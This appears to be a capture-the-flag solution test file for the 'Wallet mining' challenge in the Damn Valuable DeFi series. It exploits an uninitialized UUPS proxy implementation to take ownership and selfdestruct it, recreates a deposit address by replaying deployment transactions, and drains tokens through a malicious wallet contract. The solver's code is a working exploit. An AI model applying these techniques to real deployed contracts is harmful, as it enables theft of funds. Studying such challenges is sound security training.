const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { Factory, Copy, MiddleTx } = require("./mainnetTxHex.json");

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        this.authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        
        expect(await this.authorizer.owner()).to.eq(deployer.address);
        expect(await this.authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await this.authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            this.token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(this.token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(this.authorizer.address);
        expect(await walletDeployer.mom()).to.eq(this.authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await this.token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await this.token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await this.token.balanceOf(player.address)).eq(0);
    });



    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        /** 
         * Step 1: Find the necessary nonces to deploy contracts at specific addresses
         */
        let addr;
        let depositWalletNonce;
    
        // Calculate the nonce needed to deploy the deposit wallet at the target address
        for (let i = 1; i < 100; i++) {
            addr = ethers.utils.getContractAddress({
                from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
                nonce: i,
            });
            if (addr == "0x9B6fb606A9f5789444c17768c6dFCF2f83563801") {
                console.log("Deposit wallet target address", addr, "recreated");
                console.log("Deposit wallet deployment nonce", i); // nonce = 43
                depositWalletNonce = i;
            }
        }
    
        // Calculate the nonces needed to deploy the Gnosis Safe factory and master copy
        for (let i = 0; i < 100; i++) {
            addr = ethers.utils.getContractAddress({
                from: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
                nonce: i,
            });
            if (addr == "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B") {
                console.log("Safe Factory target address", addr, "recreated");
                console.log("Safe Factory deployment nonce", i); // nonce = 2
            } else if (addr == "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F") {
                console.log("MasterCopy target address", addr, "recreated");
                console.log("MasterCopy deployment nonce", i); // nonce = 0
            }
        }
    
        /** 
         * Step 2: Deploy the factory, master copy, and deposit wallet contracts based on the calculated nonces 
         */
        let tx, deployer3;
        deployer3 = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
        tx = {
            from: player.address,
            to: deployer3,
            value: ethers.utils.parseEther("1"),
        };
    
        // Send transaction to fund the deployer address
        await player.sendTransaction(tx);
    
        let DeployedFactory, deployedFactory, deployedCopy;
    
        /**
         * Deploy contracts using calculated nonces:
         * - MasterCopy (nonce = 0)
         * - Intermediate transaction (nonce = 1)
         * - Safe Factory (nonce = 2)
         */
    
        // Deploy masterCopy (nonce = 0)
        deployedCopy = await (await ethers.provider.sendTransaction(Copy)).wait();
    
        // The intermediate transaction (nonce = 1)
        await (await ethers.provider.sendTransaction(MiddleTx)).wait();
    
        // Deploy Safe Factory (nonce = 2)
        deployedFactory = await (await ethers.provider.sendTransaction(Factory)).wait();
        DeployedFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(deployedFactory.contractAddress);
    
        let depositWallet, MockWallet, mockWallet;
    
        // Deploy the mockWallet logic contract
        MockWallet = await ethers.getContractFactory("MockWallet");
        mockWallet = await MockWallet.deploy();
        console.log("MockWallet deployed at", mockWallet.address);
    
        // Deploy deposit wallet and drain 20 million DVT tokens
        let functionData = MockWallet.interface.encodeFunctionData("attack", [
            this.token.address,
            player.address,
        ]);
    
        // Deploy our mockWallet at the specific nonce (43)
        for (let i = 1; i <= depositWalletNonce; i++) {
            if (i == depositWalletNonce) {
                depositWallet = await DeployedFactory.createProxy(
                    mockWallet.address,
                    functionData
                );
            }
            depositWallet = await DeployedFactory.createProxy(mockWallet.address, []);
        }
    
        /**
         * Step 3: Take over the Authorizer logic contract and upgrade it to the fakeAuthorizer contract
         */
        const AuthorizerLogic = await ethers.getContractFactory("AuthorizerUpgradeable");
        const authorizerLogicAddr = await upgrades.erc1967.getImplementationAddress(this.authorizer.address);
        const authorizerLogic = await AuthorizerLogic.attach(authorizerLogicAddr);
        
        // Call init function on the authorizer logic contract to become the owner of it.
        await authorizerLogic.connect(player).init([player.address], [this.token.address]);
    
        // Deploy the fakeAuthorizer contract
        const FakeAuthorizer = await ethers.getContractFactory("FakeAuthorizer");
        const fakeAuthorizer = await FakeAuthorizer.deploy();
        
        let abi = [`function suicide()`];
        let iface = new ethers.utils.Interface(abi);
        let data = iface.encodeFunctionData("suicide", []);
    
        // Upgrade the logic contract and call the attack function to execute selfdestruct
        await authorizerLogic.connect(player).upgradeToAndCall(fakeAuthorizer.address, data);
    
        /**
         * After selfdestruct, we can pass the check in the can() function in WalletDeployer.
         * There are initially 43 DVT tokens in the walletDeployer, we have to drain it by calling drop() 43 times
         */
        for (let i = 0; i < 43; i++) {
            await walletDeployer.connect(player).drop([]);
        }
    });
    

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.not.eq('0x');

        // Master copy account must have code
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.not.eq('0x');

        // Deposit account must have code
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
        expect(await this.token.balanceOf(walletDeployer.address)).to.eq(0);

        // Player must own all tokens
        expect(await this.token.balanceOf(player.address)).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
